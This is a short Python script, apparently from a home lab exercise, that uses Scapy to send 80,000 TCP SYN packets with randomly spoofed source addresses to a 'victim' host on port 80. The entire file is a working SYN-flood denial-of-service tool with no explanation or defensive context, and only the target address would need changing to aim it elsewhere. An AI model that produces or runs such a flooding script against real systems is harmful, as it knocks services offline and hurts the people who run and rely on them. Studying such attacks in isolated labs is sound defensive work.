#!/usr/bin/env python3

from scapy.all import IP, TCP, send
import random
import time

TARGET_IP = "192.168.56.103"   # ✅ Victim's Host-only IP
TARGET_PORT = 80
PACKET_COUNT = 80000
DELAY = 0.001  # delay between packets (optional throttle)

print(f"Sending {PACKET_COUNT} spoofed SYN packets to {TARGET_IP}:{TARGET_PORT}")

for i in range(PACKET_COUNT):
    spoofed_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 4294967295)

    ip = IP(src=spoofed_ip, dst=TARGET_IP)
    tcp = TCP(sport=sport, dport=TARGET_PORT, flags="S", seq=seq)

    pkt = ip / tcp
    send(pkt, verbose=0)

    if (i + 1) % 100 == 0:
        print(f"Sent {i + 1} packets")

    time.sleep(DELAY)
